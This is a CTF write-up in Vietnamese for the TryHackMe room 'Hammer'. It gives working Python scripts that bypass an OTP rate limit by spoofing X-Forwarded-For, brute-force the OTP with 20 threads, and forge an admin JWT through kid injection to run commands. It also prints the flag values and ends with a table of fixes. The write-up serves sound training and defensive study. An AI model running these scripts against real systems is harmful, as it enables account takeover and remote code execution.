# Hammer

| | |
|---|---|
| **Platform** | TryHackMe |
| **Link** | https://tryhackme.com/room/hammer |
| **Độ khó** | Medium |
| **Chủ đề** | Web, Authentication Bypass, JWT, RCE |
| **Ngày** | 14/06/2026 |

---

## Mô tả

Ứng dụng web chạy trên cổng 1337 — hệ thống đăng nhập có tính năng reset password qua OTP 4 chữ số. Challenge gồm 4 bước nối tiếp:

1. Enumerate directory listing → đọc error log → tìm email người dùng
2. Bypass rate limit qua `X-Forwarded-For` header → brute force OTP 4 số → reset password → đăng nhập → **Flag 1**
3. Phân tích JWT trên dashboard → phát hiện `kid` injection (trỏ đến `/var/www/html/hmr_logs/error.logs` là file có nội dung đã biết)
4. Forge JWT với role `admin` → execute command → **Flag 2**

---

## Trinh sát

### Quét cổng

```bash
nmap -sV -sC --open -p- --min-rate 5000 10.48.167.10
```

| Cổng | Dịch vụ | Phiên bản |
|------|---------|-----------|
| 22/tcp | SSH | OpenSSH 8.2p1 (Ubuntu) |
| 1337/tcp | HTTP | Apache/2.4.41 |

Toàn bộ challenge nằm trên web cổng 1337.

### Khám phá web

Truy cập `http://10.48.167.10:1337/`:

- Trang chủ là form đăng nhập với field `email` và `password`
- Có link "Forgot your password?" trỏ đến `/reset_password.php`
- HTML comment tiết lộ **naming convention** của server:

```html
<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->
```

Dựa vào gợi ý này, thử truy cập `/hmr_logs/`:

```
http://10.48.167.10:1337/hmr_logs/
```

Apache directory listing bật → thấy file `error.logs`.

---

## Khai thác

### Bước 1 — Đọc error log để tìm email

```bash
curl http://10.48.167.10:1337/hmr_logs/error.logs
```

Trong log có dòng:

```
[Mon Aug 19 12:02:34.876543 2024] [authz_core:error] ... AH01631: user tester@hammer.thm:
authentication failure for "/restricted-area": Password Mismatch
```

**Email tìm được: `tester@hammer.thm`**

---

### Bước 2 — Bypass rate limit để brute force OTP

Truy cập `/reset_password.php`, submit email `tester@hammer.thm` → server chuyển sang trang nhập OTP 4 chữ số với timer đếm ngược **180 giây**.

Thử brute force thủ công → sau **4 lần sai** xuất hiện thông báo *"Rate limit exceeded. Please try again later."* — server giới hạn theo IP.

**Phát hiện bypass:** Server dùng header `X-Forwarded-For` để xác định IP thay vì IP thực. Gửi kèm header với IP khác nhau sau mỗi 4 lần thử là đủ để vượt rate limit.

**Thách thức về tốc độ:** OTP có 10.000 giá trị (0000–9999), timer chỉ 180 giây. Mỗi request mất ~380ms → sequential brute force chỉ thử được ~447 codes trước khi hết giờ.

**Giải pháp:** Dùng 20 thread song song, tất cả dùng cùng session cookie `PHPSESSID` (OTP gắn với session), mỗi thread phụ trách một khoảng 500 code và tự xoay vòng IP fake riêng:

```python
import requests
import threading
import sys

TARGET = "http://10.48.167.10:1337"
EMAIL = "tester@hammer.thm"
NEW_PASS = "Hacker1234!"

# Step 1: Lấy session và OTP
main_session = requests.Session()
r = main_session.post(f"{TARGET}/reset_password.php", data={"email": EMAIL})
phpsessid = main_session.cookies.get("PHPSESSID")

found = threading.Event()
result = [None]
lock = threading.Lock()

def worker(start, end, thread_id):
    ip_base = thread_id * 2000
    attempt = ip_offset = 0
    for code_int in range(start, end):
        if found.is_set(): return
        code = f"{code_int:04d}"
        if attempt >= 4:
            ip_offset += 1
            attempt = 0
        n = ip_base + ip_offset
        fake_ip = f"172.{(n//65536)%256}.{(n//256)%256}.{n%256}"
        try:
            r = requests.post(f"{TARGET}/reset_password.php",
                data={"recovery_code": code, "s": "170"},
                headers={"X-Forwarded-For": fake_ip,
                         "Cookie": f"PHPSESSID={phpsessid}"},
                timeout=10)
            attempt += 1
            if "Rate limit" in r.text: attempt = 99; continue
            if "Invalid or expired" not in r.text and "Time elapsed" not in r.text:
                with lock:
                    if not found.is_set():
                        result[0] = (code, fake_ip)
                        found.set()
                return
        except: continue

NUM_THREADS = 20
chunk = 10000 // NUM_THREADS
threads = [threading.Thread(target=worker, args=(i*chunk, (i+1)*chunk, i))
           for i in range(NUM_THREADS)]
for t in threads: t.daemon = True; t.start()
found.wait(timeout=170)

code, fake_ip = result[0]
print(f"[+] OTP found: {code} in ~25 seconds")

# Step 2: Đặt mật khẩu mới
requests.post(f"{TARGET}/reset_password.php",
    data={"new_password": NEW_PASS, "confirm_password": NEW_PASS},
    headers={"X-Forwarded-For": fake_ip,
             "Cookie": f"PHPSESSID={phpsessid}"})

# Step 3: Login
s = requests.Session()
r = s.post(f"{TARGET}/index.php", data={"email": EMAIL, "password": NEW_PASS})
# r.url → http://10.48.167.10:1337/dashboard.php ← thành công
```

**20 thread song song → tìm OTP trong ~25 giây, trong ngưỡng 170 giây.**

---

### Bước 3 — Đăng nhập lấy Flag 1

Sau khi reset password, login với `tester@hammer.thm` → redirect đến `/dashboard.php`:

```html
<h3>Welcome, Thor! - Flag: THM{AuthBypass3D}</h3>
<p>Your role: user</p>
```

Dashboard có form nhập command và đoạn JavaScript nhúng JWT:

```javascript
var jwtToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9...';
```

Decode JWT header:

```json
{"typ":"JWT","alg":"HS256","kid":"/var/www/mykey.key"}
```

Decode payload:

```json
{
  "data": {"user_id": 1, "email": "tester@hammer.thm", "role": "user"}
}
```

Thử gửi command `id` tới `execute_command.php` → `{"error":"Command not allowed"}` — cần role `admin`.

**Flag 1: `THM{AuthBypass3D}`**

---

### Bước 4 — JWT kid Injection để leo lên admin RCE

#### Tại sao kid injection hoạt động?

Khi server xác thực JWT, nó đọc giá trị `kid` (Key ID) từ header, mở file đó trên filesystem và dùng nội dung làm **signing key**. Nếu file đích là file ta đã biết nội dung → ta có thể tự ký JWT hợp lệ với bất kỳ claim nào.

File `error.logs` nằm tại `/var/www/html/hmr_logs/error.logs` và **đã đọc được** qua HTTP. Điều này tạo ra vòng khép kín:

```
Biết nội dung error.logs → Ký JWT bằng nội dung đó → Server tin JWT vì kid trỏ đúng file
```

#### Forge JWT với role admin

```python
import requests, json, base64, hmac, hashlib, re

TARGET = "http://10.48.167.10:1337"

def b64url_encode(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64url_decode(s):
    s += '=' * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)

def create_jwt(header, payload, key_bytes):
    h = b64url_encode(json.dumps(header, separators=(',',':')))
    p = b64url_encode(json.dumps(payload, separators=(',',':')))
    sig = hmac.new(key_bytes, f"{h}.{p}".encode(), hashlib.sha256).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"

# Lấy JWT gốc từ dashboard
session = requests.Session()
r = session.post(f"{TARGET}/index.php", data={"email": EMAIL, "password": NEW_PASS})
orig_jwt = re.search(r"var jwtToken = '([^']+)'", r.text).group(1)
orig_payload = json.loads(b64url_decode(orig_jwt.split('.')[1]))

# Lấy nội dung error.logs làm signing key
error_log_content = requests.get(f"{TARGET}/hmr_logs/error.logs").text

# Tạo JWT với role=admin, kid trỏ đến error.logs
admin_payload = {**orig_payload, 'data': {**orig_payload['data'], 'role': 'admin'}}
forged_header = {"typ": "JWT", "alg": "HS256", "kid": "/var/www/html/hmr_logs/error.logs"}
forged_jwt = create_jwt(forged_header, admin_payload, error_log_content.encode())

# Gửi command với JWT giả mạo
r = session.post(f"{TARGET}/execute_command.php",
    json={"command": "id"},
    headers={"Authorization": f"Bearer {forged_jwt}"})
print(r.json())  # {"output":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"}
```

**RCE thành công với quyền `www-data`.**

#### Đọc Flag 2

```python
r = session.post(f"{TARGET}/execute_command.php",
    json={"command": "cat /home/ubuntu/flag.txt"},
    headers={"Authorization": f"Bearer {forged_jwt}"})
print(r.json()['output'])  # THM{RUNANYCOMMAND1337}
```

**Flag 2: `THM{RUNANYCOMMAND1337}`**

---

### Script hoàn chỉnh

```python
#!/usr/bin/env python3
"""
Hammer — TryHackMe challenge solver
Python 3, chỉ dùng thư viện chuẩn + requests
"""
import requests, threading, json, base64, hmac, hashlib, re, sys

TARGET = "http://10.48.167.10:1337"
EMAIL  = "tester@hammer.thm"
NEW_PASS = "Hacker1234!"

# ─── Phần 1: OTP brute force ────────────────────────────────────────────────

main_session = requests.Session()
r = main_session.post(f"{TARGET}/reset_password.php", data={"email": EMAIL})
phpsessid = main_session.cookies["PHPSESSID"]
print(f"[+] PHPSESSID: {phpsessid}")

found = threading.Event()
result = [None]
lock   = threading.Lock()

def worker(start, end, thread_id):
    ip_base = thread_id * 2000
    attempt = ip_offset = 0
    for ci in range(start, end):
        if found.is_set(): return
        code = f"{ci:04d}"
        if attempt >= 4: ip_offset += 1; attempt = 0
        n = ip_base + ip_offset
        ip = f"172.{(n//65536)%256}.{(n//256)%256}.{n%256}"
        try:
            r = requests.post(f"{TARGET}/reset_password.php",
                data={"recovery_code": code, "s": "170"},
                headers={"X-Forwarded-For": ip, "Cookie": f"PHPSESSID={phpsessid}"},
                timeout=10)
            attempt += 1
            if "Rate limit" in r.text: attempt = 99; continue
            if "Invalid or expired" not in r.text and "Time elapsed" not in r.text:
                with lock:
                    if not found.is_set(): result[0] = (code, ip); found.set()
                return
        except: continue

NUM_THREADS = 20
chunk = 10000 // NUM_THREADS
threads = [threading.Thread(target=worker, args=(i*chunk, (i+1)*chunk, i), daemon=True)
           for i in range(NUM_THREADS)]
for t in threads: t.start()
found.wait(timeout=170)
if not result[0]: sys.exit("[-] OTP not found")

code, fake_ip = result[0]
print(f"[+] OTP: {code}")

# ─── Phần 2: Reset password và login ────────────────────────────────────────

requests.post(f"{TARGET}/reset_password.php",
    data={"new_password": NEW_PASS, "confirm_password": NEW_PASS},
    headers={"X-Forwarded-For": fake_ip, "Cookie": f"PHPSESSID={phpsessid}"})

login_session = requests.Session()
r = login_session.post(f"{TARGET}/index.php", data={"email": EMAIL, "password": NEW_PASS})
assert "dashboard" in r.url, "Login failed"
print(f"[+] Logged in: {r.url}")

flag1 = re.search(r'THM\{[^}]+\}', r.text)
print(f"[+] Flag 1: {flag1.group()}")

orig_jwt = re.search(r"var jwtToken = '([^']+)'", r.text).group(1)

# ─── Phần 3: JWT kid injection để RCE ───────────────────────────────────────

def b64url_enc(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def b64url_dec(s):
    return base64.urlsafe_b64decode(s + '=' * (4 - len(s) % 4))

def make_jwt(header, payload, key):
    h = b64url_enc(json.dumps(header, separators=(',',':')))
    p = b64url_enc(json.dumps(payload, separators=(',',':')))
    sig = hmac.new(key, f"{h}.{p}".encode(), hashlib.sha256).digest()
    return f"{h}.{p}.{b64url_enc(sig)}"

orig_payload = json.loads(b64url_dec(orig_jwt.split('.')[1]))
error_log = requests.get(f"{TARGET}/hmr_logs/error.logs").text

forged_jwt = make_jwt(
    {"typ": "JWT", "alg": "HS256", "kid": "/var/www/html/hmr_logs/error.logs"},
    {**orig_payload, 'data': {**orig_payload['data'], 'role': 'admin'}},
    error_log.encode()
)

def rce(cmd):
    r = login_session.post(f"{TARGET}/execute_command.php",
        json={"command": cmd},
        headers={"Authorization": f"Bearer {forged_jwt}"})
    return r.json().get("output", r.text).strip()

print(f"[+] RCE check: {rce('id')}")
print(f"[+] Flag 2: {rce('cat /home/ubuntu/flag.txt')}")
```

---

## Leo thang đặc quyền

Không cần leo quyền. Cả hai cờ đều lấy được dưới quyền `www-data`. File `/home/ubuntu/flag.txt` được đặt world-readable.

---

## Cờ

| Cờ | Vị trí | Cách lấy |
|----|--------|----------|
| Flag 1 | Hiển thị trên dashboard sau đăng nhập | Bypass rate limit OTP → reset password |
| Flag 2 | `/home/ubuntu/flag.txt` | JWT kid injection → forge admin token → RCE |

| Cờ | Giá trị |
|----|---------|
| Flag 1 | `THM{AuthBypass3D}` |
| Flag 2 | `THM{RUNANYCOMMAND1337}` |

---

## Bài học

| Lỗ hổng | Gốc rễ | Cách fix |
|---------|--------|----------|
| Directory listing bật | `/hmr_logs/` không bị chặn → lộ error log chứa email nội bộ | Tắt `Options Indexes` trong Apache; chuyển log ra ngoài web root |
| Email lộ trong log | Server log ghi email người dùng kèm trạng thái lỗi authentication | Không log PII (email, username) trong production log |
| Rate limit bypass qua `X-Forwarded-For` | Server tin header `X-Forwarded-For` do client cung cấp để xác định IP → attacker gửi header giả bất kỳ | Rate limit theo IP thực (`REMOTE_ADDR`); nếu cần trust proxy thì chỉ tin từ IP proxy nội bộ đã biết |
| OTP 4 chữ số | Không gian chỉ 10.000 giá trị — quá nhỏ để chống brute force dù có rate limit | Dùng OTP 6–8 chữ số; thêm exponential backoff; khóa account tạm thời sau N lần sai |
| JWT `kid` injection | Server đọc signing key từ đường dẫn file do client chỉ định trong header JWT → attacker trỏ đến file có nội dung đã biết | Validate `kid` theo whitelist (chỉ chấp nhận key ID đã đăng ký); không bao giờ để `kid` là đường dẫn filesystem tuỳ ý |
| File log web-accessible dùng làm signing key | `error.logs` vừa public (đọc được qua HTTP) vừa được dùng làm JWT key → lộ key ngay trong ứng dụng | Không dùng file web-accessible làm cryptographic key; lưu key trong biến môi trường hoặc secret manager |
| `execute_command.php` chạy lệnh tùy ý | Endpoint chấp nhận command string rồi shell_exec trực tiếp, chỉ kiểm tra role | Dùng allowlist lệnh cụ thể; không truyền user input vào shell exec; chạy dưới user có quyền tối thiểu |
